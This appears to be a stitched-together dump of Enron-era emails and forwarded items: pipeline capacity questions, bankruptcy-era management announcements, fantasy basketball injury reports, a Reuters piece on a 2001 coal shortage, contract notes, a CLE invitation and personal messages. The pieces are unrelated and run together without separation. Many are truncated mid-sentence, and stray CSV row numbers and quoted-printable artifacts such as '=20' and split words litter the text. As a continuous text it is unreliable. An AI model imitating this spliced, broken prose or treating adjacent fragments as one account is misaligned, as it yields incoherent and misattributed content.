What is the timing for the recall notice? Can it occur after the gas day has 
started? Will we have partial day recalls?
Will the recall option & transporter put option carry over to the aquiring 
shipper? What system changes are needed for capacity release?
How do we require a shipper to take firm transport capacity? Will this have 
some type of OFO notice similar to EFBH that requires the shipper to nominate?
How will the invoice system be changed to handle the various option fee 
processes? Will we store this information at a contract level in CBS or in 
the rate system at a contract level? Who will load & monitor these fee 
options?
Do we need a new Rate Schedule?

Lindy, can you let me know when you are availble to start meeting on this new 
service so that I can create our system requirements document. I am availble 
July 24th, 25th, & 26th.

Please let me know.

Northwest Quadrant, which was also a Super Neighborhood meeting. I was
wearing my two new hats as a representative of the East Montrose Civic
Association and a member of Ada Edwards' District D Infrastructure Action
Team.  Mike Shannon from the city's finance and administration--the
people we have to send our CIP requests to--and David Leal an engineer
from the city's Public Works and Engineering departament were there.  


The Bomar and Morgan high water problem was the only issue I addressed. 
I have some Citizen Request Forms. If someone from the Bomar-Morgan spot
would like to fill one out or help me fill one out, I can hand deliver it
to city hall.  This isn't a bad idea, and it might, possibly result in
something being done between 2003 and 2007.


But I think it's also urgent that we try to get something done now.  Both
Shannon and Leal agreed that it was a good idea to try to work through
our council members at the same time to try to get something done.  As I
explained last night, we don't know what needs to be done: Is there a
storm sewer under Bomar in that block and should there be a drain at that
spot?  (I personally believe in a flat place like Houston and with
Houston's construction and maintenance crews what they are, the best way
to get water away from your property is a ditch.)  


If I can get a copy of the engineer's letter, I'd like to get it to Mr.
Leal.

3291,"With Ken Lay's resignation, you undoubtedly have questions about Enron's management structure and what lies ahead for the company.  The purpose of this communication is to begin to answer those questions and lay out the direction we plan to follow as we regroup and rebuild.

First, the Creditors Committee has proposed that the Board of Directors retain an interim CEO to focus on the restructuring process.  This is a positive sign that the Committee believes Enron will provide greater value as a viable ongoing business.

The Enron Board of Directors has approved Stephen Cooper as interim CEO and chief restructuring officer.  Steve is the managing partner of Zolfo Cooper, a corporate recovery and crisis management firm with more than 30 years experience leading companies through operational and financial reorganizations.

Steve and his firm will work with members of Enron's current management to develop and implement a comprehensive plan to restructure the company and emerge from bankruptcy.  

As you know, Enron has entered into an agreement with UBS Warburg for the sale of NetCo, Enron's wholesale gas and power trading organization.  In preparation for the transition of NetCo to UBS, Greg Whalley has resigned as president and COO of Enron to assume a position with UBS Warburg.  We want to thank Greg and the NetCo employees joining UBS for their contributions to Enron and wish them great success going forward.

In addition to engaging Steve, Enron has formed an Office of the Chief Executive.  I will join Steve in that office as president and chief operating officer, and Ray Bowen will join us as executive vice president and chief financial officer.

We will provide additional information regarding the roles and responsibilities of Enron's entire management team once those become more fully defined.

Thank you for continuing to support Enron by performing your job everyday.  The ongoing uncertainty about our future, coupled with the constant media scrutiny, makes this situation difficult for all of us. While no one can control the media, we can and will define our leadership and devise our strategy for moving ahead.  And in doing so, we will build a more certain future for our company and our employees.

 Richardson missed practice on Tuesday because of flu-like symptoms. He is=

has no real Fantasy value at this point in the season.  =20

 Kobe Bryant , G LAL - Tribe Called PLove Updated 12/13/00=20
 Bryant jammed his right little finger on a dunk during Tuesday night's los=
s=20
to the Bucks. He continued to play with his finger wrapped, finishing the=

game with 25 points on only 8-of-31 shooting. The diagnosis on the finger w=

 Bob Sura , G GS - Free Agent Updated 12/13/00=20
 Sura did not dress for Tuesday night's game against the Blazers. He is=20
battling a strained left hamstring, and is listed as day-to-day due to the=
=20
injury. Sura has averaged 8.5 points and 5.5 assists through his first 11=

 Brad Miller , C CHI - Free Agent Updated 12/13/00=20
 Head Coach Tim Floyd said that Miller could return from his broken hand as=

early as next Tuesday against Indiana. A more likely scenario, however, wou=

have Miller coming back on Dec. 21 in Orlando. Miller, who has missed 17=20

 Coleman returned to practice this week and looked good during workouts,=20
according to Head Coach Paul Silas. ""He's moving, practicing and running th=

until he gets back into playing shape.  =20

 Bryce Drew , G CHI - Free Agent Updated 12/13/00=20
 Drew, who has been sidelined with a strained hamstring, participated in hi=
s=20
first full practice on Tuesday and may return to the Bulls in time for Frid=

night's game against Atlanta. Drew had averaged six points in four games=20
before going on the injured list on Nov. 11. With a number of point guards =
on=20
the Bulls' roster, minutes are likely to be spread around, which decreases=

Drew's Fantasy value significantly. He isn't worth a roster spot at this=20
point. =20

 Otis Thorpe , F CHA - Free Agent Updated 12/13/00=20
 Thorpe, who has been out the last month with a foot injury, was activated=
=20
for Wednesday's game against Sacramento. The veteran has very little Fantas=
y=20
value, especially on a very talented Charlotte frontcourt.   =20

 Grant Hill , F ORL - The Wave Updated 12/13/00=20
 After a successful return to the court on Monday night, Hill may have take=
n=20
a step back during Wednesday night's loss to the Supersonics. He left the=

game with 1:39 remaining because of discomfort in his ankle, the same ankle=

 Adonal Foyle , C GS - Free Agent Updated 12/12/00=20
 Foyle was activated on Tuesday night in time for Golden State's game again=
st=20
Portland. He had been on the injured list after having surgery to repair to=
rn=20
ligaments in his right ring finger. Foyle averaged 2.9 points and 4.4=20
rebounds in 16 games as a starter for the Warriors. Foyle has no Fantasy=20

 Chris Crawford , F ATL - Free Agent Updated 12/12/00=20
 Crawford was placed on the injured list Tuesday with a sprained left ankle=

Fantasy value.   =20

 Rod Strickland , G WAS - Fear Updated 12/12/00=20
 Strickland left practice early on Monday due to some stiffness in both of=

his hamstrings. He is expected to play on Wednesday when the Wizards host=
=20
Allen Iverson and the Sixers. Strickland is averaging 14.5 points and 7.2=

assists per game for Fantasy owners this season, numbers which could be a=
=20
great deal better if he wasn't stuck in Washington.  =20

 Rasheed Wallace , F POR - Tribe Called PLove Updated 12/12/00=20
 Wallace, who missed Saturday night's game against Detroit because of a=20
injured right wrist, practiced on Monday with his wrist taped. He is close =
to=20
100 percent and is expected to play against Golden State on Tuesday night.=
=20
Fantasy owners who rolled the dice and played Wallace this week will be hap=
py=20

 Jerome Williams , F DET - Free Agent Updated 12/12/00=20
 Williams is currently on the injured list with a sprained right ankle. He =
is=20
scheduled to have X-rays taken on the ankle on Tuesday, and won't be eligib=
le=20
to return to action until Dec. 19. He is averaging 8.1 points and 8.2=20

 James Posey , F DEN - Free Agent Updated 12/12/00=20
 Posey and a handful of unnamed teammates may not play in Tuesday night's=
=20
game against the Heat in protest over the actions of Head Coach Dan Issel.=
=20
""The team got together and discussed some things,"" said Posey, ""and=20

Celtics. If the protest does in fact take place, Fantasy owners will miss a=
=20
night of production from some of their Denver players.  =20

 Brevin Knight , G CLE - Free Agent Updated 12/12/00=20
 It looks like Knight will be making a return trip to the injured list. The=
=20
Cavs' reserve point guard is still feeling some discomfort in his right kne=
e,=20
and team officials are saying that he came off the injured list too soon. T=
he=20
Cavaliers are expected to activate point guard Michael Hawkins in time for=
=20
their game against Dallas on Tuesday night. With Andre Miller at the point,=
=20
neither Knight nor Hawkins has any real Fantasy value.  =20

 Alan Henderson , F ATL - Free Agent Updated 12/12/00=20
 Henderson was held out of workouts on Monday after spraining his left=20
shoulder after a hard fall during Saturday night's game against Cleveland.=
=20
Head Coach Lon Kruger said that he would wait until Tuesday to see how=20
Henderson felt, but the former Hoosiers' star had different ideas. ""The=20
shoulder's still attached to my body,"" said Henderson. ""No question I'll=20
play.""  Henderson has been a solid performer all season, and has been one o=
f=20
Atlanta's most consistent players. With trade rumors still swirling about=
=20
Dikembe Mutombo, Henderson's Fantasy value could rise even further. If he i=
s=20
still available in your league, adding Henderson to your roster would be a=
=20
smart move. =20

 Jim Jackson , G ATL - Rude Boys (Not) Updated 12/12/00=20
 Jackson is set to make his return to the court on Tuesday night as the Haw=
ks=20
face off against the Kings. He has been taken off the injured list, where h=
e=20
has spent the last eight games with a knee sprain. With the emergence of=20
Jason Terry at the two guard, Jackson will now switch back to his more=20

 a=20
roster spot if he is still available in your league, and could be a solid=
=20
replacement for those owners who just lost Eric Snow.   =20

 Tim Duncan , F SA - The Old School Fools Updated 12/12/00=20
 Fantasy owners got a real scare when Duncan went down, clutching his knee,=
=20
during Monday's game against the Jazz. It was the same knee that Duncan had=
=20
surgery on last season. He was diagnosed with a hyperextended left knee, bu=
t=20
returned to the game in the fourth quarter. He will have further evaluation=
s=20
performed on Tuesday. Duncan, who leads the Spurs in both scoring and=20
rebounding, is one of the most coveted stars in all of Fantasy.    =20

 Eric Snow , G PHI - Rude Boys (Not) Updated 12/12/00=20
 Snow, who has been placed on the injured list by Philadelphia, will underg=
o=20
surgery on Tuesday to repair the fracture in his right ankle. He is expecte=
d=20

 Isaac Austin , C VAN - Free Agent Updated 12/12/00=20
 Austin missed Monday night's game against the Rockets with the flu. He is=
=20
listed on the NBA injury report as day-to-day. At 5.1 points and 4.6 reboun=

This spreadsheet summarizes the pricing terms for the proposed Kennedy Oil transaction that we discussed earlier.

 
Also, attached in the e-mail below, I have included a ""Discussion Document"" that Mark and Pual put together for the purpose of discussions with Kennedy.  It provides more specifics on the pricing and volume allocation, if you desire.

Based on my calculations, the 10,000/d priced at NYMEX minus $0.62 is roughly $300,000 in the money and the 5,000/d priced at NGPL MidCon minus $0.47 is roughly $500,000 in the money.

I will be out next week, but Mark and Paul will keep you posted as to the expected close date and any changes in the deal terms.  Please give me a call today if you have any questions.

    By Timothy Gardner
    NEW YORK, May 3 (Reuters) - Adding stress to an already
frazzled power market, a nationwide coal shortage could spawn
electricity brownouts in northeastern states and in the West
this summer, experts said on Thursday.
    While coal provides the country with 51 percent of its
power, years of industry underinvestment and record prices for
competing fuels natural gas and fuel oil this year have pushed
utilities' coal stocks to their lowest levels since 1974.
    In January, the last month of available government data,
stocks at electric plants were 94 million tons, 27 percent less
than a year earlier, according to the Energy Information
Administration, the Department of Energy's number cruncher.
    Thin coal stocks compound a U.S. natural gas shortage that
led to rolling brownouts in California last winter. That came
after a failed deregulation plan and amid natural gas infrastructure
bottlenecks. Natural gas prices have fallen
from last summer's all-time highs, but are still nearly twice
what they were last year at this time.
    ""In certain regions we would expect brownouts this summer,""
said Deck Sloan, spokesman for Arch Coal Inc. <ACI.N>, the
nation's second largest coal firm. ""In California that seems to
be a very high likelihood, especially given the situation with
reservoir levels behind the hydro-dams in the West,"" he said.
    Los Angeles has avoided brownouts, largely because it has a
coal cache in Utah. L.A.'s power department is the largest
participant in the 1,600 megawatt (MW) Intermountain Power
Project in Utah. The project supplies L.A. with 14 percent of
its power and lesser amounts to nearby cities Anaheim and
Pasadena as well as parts of Utah.
    One megawatt powers about 1,000 homes.
    Mike Nosanov, the operating agent of the 1,600 MW
Intermountain project, said the plant now has 700,000 tons of
coal, or 60 days supply. ""That's more than enough to keep us
out of trouble this summer,"" he said.  Still, L.A. mayor
Richard Riordan has been meeting with Utah Governor Mike
Leavitt to discuss adding another 500 to 1,000 MW to the Utah
plant, though it would take years to add the capacity.

    OVERLOADED RAILROAD
    Another potential problem is stemming from the nation's
largest coal producing state, Wyoming, which delivers coal to
24 states.
    The two major railroads at Wyoming's Powder River Basin,
Union Pacific and Burlington Northern Santa Fe, operate a joint
line out of the mines that has reached its capacity of 64
trains per day or more than 300 million tons per year.
    ""The two lines could probably carry another 10 to 20
million tons (per year) out of Wyoming's Powder River Basin.
Beyond that it may take additional investment by the railroads
in order to get more production out of the basin,"" said Sloan.
    The Midwest is also thirsty for Wyoming coal. A proposal to
build a $1.4 billion coal rail project from Wyoming to power
plants in the Midwest is in the works.
    Hill and Associates, an independent industry consulting
firm, agrees that Wyoming coal trains are at their limits, a
problem that will take years to solve. ""The question is who is
going to make the investment?"" asked Hill and Associates Vice
President John Hanou. ""The mines or the railroads?""

    COAL DROUGHT ALL OVER
    Northeastern states, where years of production
underinvestment has led to thin stocks, are also in danger,
said Arch Coal's Sloan. ""We could also see the Northeast, if
the summer is normal or hotter than normal, suffer brownouts as
well,"" he said.
    Adding to the mix, Massey Energy <MEE.N>, the nation's
seventh-largest coal company, experienced flooding last month
in one of its major mines in Appalachia.
    ""In this current atmosphere, that is a hell of a big story,
said Jim Thompson, general manager of Energy Publishing, a Hill
and Associates affiliate.
    And the EIA reported utilities so far this year are burning
six percent more coal than last year. Prices on the spot market
have jumped, though long-term contracts make up 80 percent of
coal deals, which mean consumers will mostly be protected from
rising prices.
    But utilities may find themselves scrambling for coal. ""As
far as we can tell there is no coal available anywhere,"" warned
a Hill and Associates supply report this spring.
    ""Brownouts are possible,"" said Lehman Brothers coal analyst
Peter Ward. ""Utilities have gotten complacent. Coal has been a
buyer's market for about two decades. That has suddenly changed
in the past three months, and for many utilities with low
inventories, that is a scary situation.""
    Analysts said high coal prices should eventually spur
increased production of the fuel, and new natural gas and coal
plants will eventually clear up brownout threats. ""But we're
not going to see much capacity come on line for at least three
years,"" said Hanou.

1. Advantages to the single contract:

Don't need a consolidation agreement, so we don't have to negotiate one.
Better from a liability standpoint.
Easier to administer.

Is there any reason we can't go with a single contract?

2. Repayment/prepayment

I'm working with Steve on the letter agreement.

3.  Assignment to Mitsui

Steve is confirming payment issues, and ability to comply with GE's requested 
payment within 3 days of executing the contract.  This means that the 
assignment and assumption needs to be executed contemporaneously with the GE 
contract.  I have a call in to Rob Stevens to verify, in Stan's absence.  
Peggy is checking on this, also.

4. Parent guaranty.

GE is requesting an Enron parent guaranty.  From a quick review of the draft 
contract, it appears that a change in language will be necessary, since the 
current version only requires a parent guaranty in the case of an assignment 
to a certain class of assignees.  If I am correct, then I suggest consider 
inserting new language that the parent guaranty will be due 30 days after 
execution of the contract, so that Mitsui can provide the guaranty, if 
necessary.

3509,"Meeting of Insurance Law Section
Four Seasons Hotel - Austin
Room: San Jacinto West
June 14, 2001

The Insurance Law Section would like to personally invite you to attend the 
Insurance Law Section meeting and the free CLE which will be presented next 
Thursday, June 14, 2001 at the State Bar convention in Austin.

On June 14, 2001, the Insurance Law Section will hold its annual meeting and 
sponsor its annual 3 hour CLE program at the Four Season's Hotel. As usual, 
Council members and Committee chairs will be elected  by the Section members  
at the annual meeting. The schedule for the meeting and the CLE program is 
set out below. We hope that you can attend the annual meeting and the CLE 
presentations.

1:30 PM to 2:00 PM - - annual section meeting and election of Council members

2:00 PM to 5:00 PM  FREE   CLE program


2 p.m. - 3 p.m.
Insurance Declaratory Judgment Actions
Topic: This panel will consider declaratory judgment actions regarding 
insurance coverage. When should they be filed? Who should file them? What 
discovery is necessary and appropriate? Can they usually be resolved by 
summary judgment? How should these cases be tried? What is the proper role of 
the expert? What is the proper role of the jury? What are the appellate 
twists?

Comment: The Supreme Court of Texas has repeatedly suggested that insurers 
and insureds alike put this procedural device to more use.

Panelists:
Mike Huddleston
Karen Keltz
Rusty McMains
Claudia Volaire
Beth Bradley
Stephen Walraven

3 p.m.- 4 p.m.

When Negligence Blindly Assists Deliberateness

Topic: Suppose Mr. Sleeze Ball sets out to kill his business partner, Cheese 
Square. Suppose further that Mrs. Ball helps Sleeze in various ways which 
turn out to be necessary. Suppose further that Mrs. Ball does not realize 
what Sleeze is up to and does not foresee the consequences of her actions. 
Finally, suppose Sleeze is convicted of murder and then a wrongful death 
action is brought by Cheesey's family (Swiss, Cheddar, and the rest) against 
both Mr. and Mrs. Ball, and their dog Astral. Naturally the Balls have 
homeowner's coverage and Mrs. Ball wants a defense. Question: Should she get 
it?

Comment: This is a burning issue in contemporary liability insurance law, and 
a great deal turns on it. Plaintiff's personal injuries lawyers take note.

Debaters:
Michael Sean Quinn - Affirmative
Christopher Martin - Negative

4 p.m. - 5:00 p.m.

Insurance Defense Guidelines

Topic: Many liability insurers have attempted to issue guidelines and rules 
to govern the ways in which defense lawyers may conduct defenses. Often, if 
the activities of defense counsel do not conform to these guidelines defense 
counsel do not get paid. Recently the Texas legislature outlawed these 
guidelines, or at least some of them. Is this law a good idea, or a bad one? 
Will it be effective? Will it be enforced? Is it really in the interest of 
insureds who are defendants in law suits or is it designed to help lawyers?

Panelists:
Charles Levy
Roland Leon
Clark Richards

Format: Audience participation on all of these topics is welcomed.
It is positively encouraged, not that it could be stopped anyway.

We hope to see you there next week.

I received your voice mail regarding my comment about substituting the LOC.  
The reason for this suggestion is to provide flexibility in our financing 
structures, depending on which entities own equity in the LLC at the time of 
the posting of the security.  Perhaps language such as  ""an appropriate 
payment security"" or other similar language can be utilized. Please be 
assured that I have an understanding of the differences between an LOC and a 
corporate guaranty.

The draft responses have been forwarded to the Enron tax department, due to 
the discussions concerning certain tax issues.  I believe it is appropriate 
to get their approval of the language prior to these answers being released.

Also, I don't believe I fully appreciate the context of these questions and 
answers, and how and to whom these answers will be given. A brief explanation 
would be most appreciated.

BUSINESS HIGHLIGHTS

Enron Industrial Markets
EIM has recently formed a Forest Products Origination team led by Rob Saltiel to pursue structured transactions.  Typically, these deals employ a combination of physical supply/offtake, price risk management and/or finance to bring value to Enron and our customers.  Priority commodities include pulp, newsprint, recycled papers, linerboard, and lumber.  Response to the new team's efforts has been positive, as many of the Forest Products companies have needs for commodity and capital solutions that are currently unavailable.  

Enron Freight Markets
During its first month in the over-the-road (OTR) trucking business, Enron Freight Markets has completed over 120 spot OTR trades.  On Friday, March 18, there was a shortage in the Houston outbound market and capacity was selling for $1.65 per mile.  By comparison, average market price has stayed in the $1.05-$1.10 per mile range in recent weeks.

EnronOnline
On May 23, Enron Corp. announced that it completed its one-millionth transaction on EnronOnline, the world's largest web-based e-commerce platform for commodities. As an online extension of its successful wholesale energy business, EnronOnline began transacting natural gas and electricity on November 29, 1999.  Since that time, the company has extended the platform to approximately 1500 wholesale commodity products ranging from energy-related commodities to bandwidth, metals, forest products, plastics, petrochemicals, and weather and credit derivatives.

Approximately 60 percent of all Enron transactions are now conducted online, and the cost of processing the transactions has been reduced by 75 percent. 

EnronOnline Statistics

Below are the latest figures for EnronOnline as of May 23, 2001

?		Total Life to Date Transactions   > 1 million
?	Life to Date Notional Value of Transactions   > $600 billion
 

IN THE NEWS
Enron Corp. Chief Executive Officer Jeff Skilling likes to say that the nation's leading energy merchant was ready for the Internet long before there was anything.com. Enron's business of buying and selling commodities - by phone or fax - was a natural fit for the Web. The challenge now is to get the new broadband Internet trading unit on solid footing by proving that bandwidth can be traded like a commodity. BusinessWeek e.biz/May 14,2001.

Here is a brief email on a possible resolution for the European/Oslo  weather 
situation.  Mark sent this draft to me last weekend but i haven't had time to 
review it this week.  Personally, I think that this is the wrong answer from 
a Corporate perspective but this issue keeps hanging around and isn't worth 
any more of our time.  For what it is worth, I think our communication 
strategy did make a big difference but didn't get us exactly where we needed 
to be.  These groups will be expected (and held accountable) for good and 
consistent communication on an ongoing basis as well.   For a P&L that is 
this small (and negative) we are all spending too much time on this.  There 
is more to this story but I think we should just drop it and move on to 
bigger and better things.

I am certainly not wedded to any of this but would rather focus on all the 
other issues and problems on my plate.  Let's discuss upon your return on our

    Plan for the Playoffs     The Fantasy season is nearing its end, and the playoffs are on the horizon. For Fantasy 2001 players, the playoffs begin with NFL week 15 (games of Dec. 22-23) and last two weeks, with the championship game in week 16 (games of Dec. 29-30.)  If you're in a Football Commissioner league, go to Schedule, Playoffs to see when your playoffs start and how many rounds they last. Of course, the matchups are probably still not determined, so you may not see teams listed in the brackets. The commissioner of your league is responsible for adding the teams to your playoff brackets at the end of your regular season.  If your team is still in contention, go to NFL Teams, Schedule and take note of the NFL teams with byes during your playoff weeks, so you know which players will be available if - and WHEN - your team competes in a playoff matchup.  	


    Game-by-Game Analysis     Go to Players, Game Log to see how a particular player did in each game this season. The player's statistics in the common categories will be displayed for each game. If you are breaking down free agents, the game log is great way to see who's been getting the most consistent production.

3568," As a follow-up to the recent Enron Corp. memorandum forming Enron Wholesale 
Services (EWS), effective today, we have reorganized the Wholesale Services 
Legal Department.

 The goals in reorganizing the department are as follows:  (i) align the 
legal department as closely as possible with the business units, (ii) speed 
the flow of legal technology across the business units, and (iii) achieve

3569,"Hello All-

Attached above are the cover letter and proposed tariff sheets filed by Texas 
Eastern yesterday for a June 1 effective date.  The rate changes reflect 
under recoveries in their ASA account which tracks their cash-out mechanism 
and increased cost of system fuel.  The underrecovery in the ASA account has 
increased from $22,000 to over $22,000,000 over the period September 1--March 
31.  Texas Eastern claims that this is largely a result of the gaming of 
their currently monthly cash-out (which will likely be changed to weekly in 
their 637 proceeding).  As a result, Texas Eastern is seeking a waiver of the 
annual filing period in order to begin collecting the underrecovery through a 
surcharge that would amount to as much as $.0354 from ELA-M3.  Texas Eastern 
proposes to begin recovery in June so as to extend the recovery period from 
12 months (Dec-Nov) to 18 months (Jun-Nov), which will lower the level of the 
surcharge.

We'll review the filing to see if there are any grounds for protest / 
comment.  These types of dollars are usually ""rubber-stamped"" by FERC for 
pass-through but the filing to change the recovery time period may give us 
some grounds to protest the recovery.

 The full filing can be found at :  
http://infopost.link.duke-energy.com/infopost/default.asp?pipe=TE

Please let me know if you have any questions or need any additional 
information.

Princesses,

This is just a reminder on the Children's Museum activity planned for
Saturday, 12/2/00.  This activity will be from Noon until 5:00pm.   The
admission is $10.00 for the Parent and the Child.  Please keep in mind that
the trip does not necessarily have to begin at Noon.  This is an activity
where you can set an arrival time that is convenient for yourself or your
tribe.   Just remember that the Museum closes at 5:00pm.  Unfortunately, I
have an emergency that can not be avoided so I will be arriving probably
later in the day if at all.  Please contact anyone who you feel may benefit
from this outing whether it be tribal members or family and friends.   I
will be in touch again soon to give details on the Holiday Skating Party at
the Sharpstown skating center.  I hear that Santa is going to be there so
I'm sure that it's going to be a blast.

3574,"At this week's NGTL TTP meeting, NGTL announced that it was planning to complete a COS study on the Alberta system.  According to NGTL, the purpose of this study is to determine whether their costs are appropriately distributed to their services.  It's likely that this will be setting the groundwork for a new rate application.  This study is currently underway by NGTL.  They will be requesting industry participation at the July 10th TTP meeting.  Discussions between NGTL and industry will occur starting the second half of August and continue until at least early October.

NGTL gave preliminary indications on the areas that will be included in the review.  They include:

	Current receipt and delivery tolls
	Intra-Alberta delivery
	Storage
	Extraction
	Transfers
	Assignments
	Account management

NGTL went down a similar path as part of the initial Products and Pricing Application.  They had initially proposed fees for transfers, assignments, and NITs.  This was strongly opposed by industry at the time and was dropped from the application.  It appears that they are going to try again.  

I will provide each of you with a copy of the hand-out from the meeting.  There is not much more detail than I have outlined here at this point.  These meetings will require a significant time commitment by Enron.  By mid-July, we need to determine (1) what level of involvement we want to have, and (2) if we want to participate, who is the best person to handle the responsibilities.  In the last negotiations, NGTL negotiated almost exclusively with CAPP on the tolling structure.  Other industry members were involved close to the end.  We were very involved on the issues that impacted us, i.e., fees for NIT, etc.  NGTL was heavily criticized about the lack of industry participation in the P&P negotiations.  It appears that they are planning to get more industry involvement this time.

I will set up a meeting later this month to discuss further and to make a decision about our involvement.  Please let me know if you have any questions.

3592,"Frank,

By not being able to trade C$ denominated products we would not be able to trade most of the physical products including cash, one month, index gas, or be able facilitate long term structures.  Having said that, if the time period for not trading these products was only 45 days, they could get past that without any major damage being done.  It will take longer to get physical contracts in place in Canada than it will financial.  The extra time the Canadian office would have before it traded physical C$ products would allow them to obtain a critical mass of trading counter parties.  If it was going to be 120 or 180 days, then there would be problems.

I hope this helps, let me know if you need any else.

*~*~*~*~*~*~*~*~*~*

This is  a new day and time for this meeting.  Thank you and I apologize for any inconvenience.

Background:  A request was received by the Gas Tactical group that would have implications on the system you use.  The request was to have the existing warning window appear if the trader enters a date that is before the date of the trade.  Knowing that there are times where trades can be back dated we cannot restrict this but to have the trader see a warning window appear to make them double check their dates (if they are for a previous date) would be beneficial to the requestor.  If they know the date is correct they would have the option to continue with the terms.

Often times, due to human error, Book Admins see mistakes made where the trade date is 10/15/01 and the terms are 10/01/01 to 10/31/01.  Because we are in the middle of the month a red flag is being raised with the Book Admins to question this trade.  Often times it is found that it was a mistake.  To date the system will only show a warning window if the trade terms were for 9/01/01 to 9/30/01.

Request Review:  Is it possible to allow the existing warning window to display for a date that is before the trade date (even a day before) and not just for a different month?

Thank you in advance.

3624,"The approval process initiated in 1998 for all meeting and event expenditures 
in excess of $5,000 has enabled ENA to better assess the business value of 
events, accurately track our activities and save money.  These events include 
customer and employee meetings, and trade shows.  

ENA has made some modifications to the process, which are described in this 
memo.

The $5,000 threshold remains in effect for all customer events.  However, the 
threshold for approval for employee meetings and events has been lowered to 
$2,000, and some additional requirements must be met prior to approval.

Please be sure to follow the procedures described below for all meetings and 
events, so we can continue to successfully manage these events.

1) Prior to making any commitments to customers or vendors, all customer 
events with anticipated costs in excess of $5,000, and all employee events 
with anticipated costs in excess of $2,000 must be reviewed by the ENA Public 
Relations (PR) department and approved by the ENA Office of the Chairman

2) The PR department will handle the site search and hotel contract 
negotiations for all such events.  Once this is completed, the PR department 
will work with you to plan and produce your event in its entirety; or they 
can provide as much or as little assistance as you require. The PR department 
will be responsible for helping you achieve the best value for your program 
and ENA.

3) A completed expenditure request form (see attached) and supporting 
documentation is required for each event.  Employee meetings require a 
detailed agenda as part of the event documentation prior to approval.  Please 
submit the completed expenditure request form and documentation to the PR 
department at EB 3642, or work with PR department employees to complete the 
form.

4) After PR review, the expenditure will be submitted to the ENA Office of 
the Chairman for final approval.

Additionally, the PR department can assist in the procurement of tickets for 
various local sporting events and concerts.

If you have any questions regarding this process, would like assistance 
planning an event, or need tickets for a Houston event, please contact Dorie 
Hitchcock in the PR department at (713) 853-6978.

Starting Wednesday, we all have lots of work to do to get the new company up and running on time.  Going forward,  we need to be a proactive organization as opposed to a reactive organization.  Given that we have the best people in the organization going over, this should not be difficult to accomplish.
 
Let me be very clear.  Playing on the internet will not be tolerated.  There is too much that has to get done over the next two weeks.  That message needs to be communicated to everyone going to the new company.  If people feel like they do not have anything to do,  they should be reading about options or the gas business.  This is a great opportunity for people to make themselves better employees.  I have no problem changing the lists if someone steps up,  or if someone doesn't.  
 
Below,  are a few things I need your help with over the next few days.

(i)    Budget (due Jan 2, 2002)                                                 
        First year budget to include all start up costs (some of which can be amortized) 

Each of you needs to draw up a budget for your region by the end of the day Wednesday.  Use the format that we used for the Enron 2002 Budget process.  Russ and Greg.  You will be one cost center in the new organization.

John,  can you be responsible for coordinating this and compiling all budgets into one by Wednesday night?


(ii)     Re-start/Integration Plans (due on Jan 3)                               To be forwarded to Louise       
        These plans need to be detailed and show clear detailed timelines and detailed responsibilities for getting us up and running as soon as possible.  The current restart date is January 21, 2001 but may be pushed forward to January 14, 2002.     

I need to detailed plans for what files we are moving,  the systems we need,  and anything that will make the move better for the business.

Kam - Can you coordinate and give me the list be Thursday evening?

(iii)   Seating Plans                                                   Tammy Shepperd to co-ordinate 
        We need to start the planning process for seating as we will be living on floors 5 & 6 of the Enron South building.

If you have any preferences in this area let me know ASAP, so that I can make requests now.

(iv)    Due Diligence 
        We continue the process with two new companies this week (Wednesday and Thursday). Andy Zipper is taking the lead for the company arriving on Wednesday, please help him with his requirements.

Just so you know, there will be more people in this week.

Please let me know how I can help in getting everything done.  I look forward to a great year working with all of you.  Thanks for all of your hard work.

3644,"	In order to bring better legal coordination and standardization to Enron's Risk Assessment and Control (RAC) group, we have formed a new legal group, which will initially include Lisa Mellencamp (Finance), Marcus Nettelton (Power Trading), Carol St. Clair (Broadband/Power Trading), Mary Cook (Financial Swaps), Peter Keohane (Canada), Ed Essandoh (Retail), Paul Darmitzel (Retail) and Elizabeth Sager (Power Trading) (Team Leader).  This group will focus on, among other things, managing Enron's exposures with bankrupt counterparties, working out credit solutions with distressed counterparties and standardizing our overall credit practices.  The initial members in this group have been drawn from Enron's numerous legal groups in order to gain a broader perspective.   Each of these members will provide support to this new group in addition to their current responsibilities.

	Within RAC, Michael Tribolet will focus on distressed counterparties, in conjunction with Bill Bradford, who continues to manage the Credit Risk Management group.    

	Please join us in supporting the efforts of this new group.

cheese and green beans.  After we relaxed for a while, we started getting 
ready for their baths and we all went to bed around 8:30 p.m.  I was 
exhausted from being out late Tuesday and Wednesday night.  I woke up around 
1:00 a.m. and watched TV for a few minutes and went back to bed.   I was 
tired.

How are ya doing?  I hear you are doing  origination now with Laura Luce (sp?).  Are you liking it?  I have  been thinking of  you.
 
Me and the boys are just doing nothing but fun kids  stuff.   They go to Mothers Day out about twice and week from 9:00 to  2:00 and I really enjoy my alone time...  I have been trying to update my  house since we will be here for a while.  I updated my kitchen and am  redecorating the boys room.  I am also getting the entire upstairs painted  but the paint I picked might be a little dark.  I have a hard time picking  colors and paint but I am sticking with it for at least a year before I  repaint.    I think the color is starting to grow on me  already.
 
Hope the boys are doing great, I know they can be  handful!

Here you go!!!",,,
3725,"Welcome to Enron Center South. As you have probably already noticed, things look a little different here. We wanted to orientate you to your new environment and inform you about the future technology coming on-line in the coming weeks. 

Occupancy Guidebook To Enron Center South
You will find this handy guide on your desk; it contains information concerning the enhanced printer environment, the new easy access keyboards and telephony procedures.

NEC Monitors
The NEC monitors have an internal anti-glare screen to help reduce eye strain and eliminate the need to install an additional screen cover.  Additionally, an integrated speaker has been installed on one monitor for each desk.

Turret Users
An ""Alliance MX turret quick reference guide"" has been placed on your desk; this includes important information about the new features such as ""Caller ID"" and ""Voicemail Indication"".

Increased Information Access
There are many NEC 50"" Plasma screens installed on the 5th and 6th floors.  While many of these will be displaying information designed for the specific unit, others will be displaying various television channels.  The audio to these television channels can be accessed via any of your telephony equipment.  Here's how:

Ten audio channels have been set up for access from your either your Avaya telephone, Stentophon, or IPC Turret.  The channels have been defined on Page 15 of your Turret.  To access the audio from either your Avaya or Stentophon, simply dial the extensions shown in the table below:
 
Channel	Avaya	Stentophon	
Weather Channel	12401	801	
CNN Headlines News	12402	802	
CNN Financial News	12403	803	
CNBC	12404	804	
MSNBC	12405	805	
Bloomberg	12406	806	
Financial News Network	12407	807	
CNN	12408	808	
Fox Sports	12409	809	
ESPN1	12410	810	


Wireless Telephony
You may notice the cellular phone coverage is not consistent across the floor, and some areas have virtually no coverage at all.  We are implementing a multi-network ""in-building"" system to provide consistent high quality service for the campus, keeping you in touch while you are on the move.  

Wireless LAN
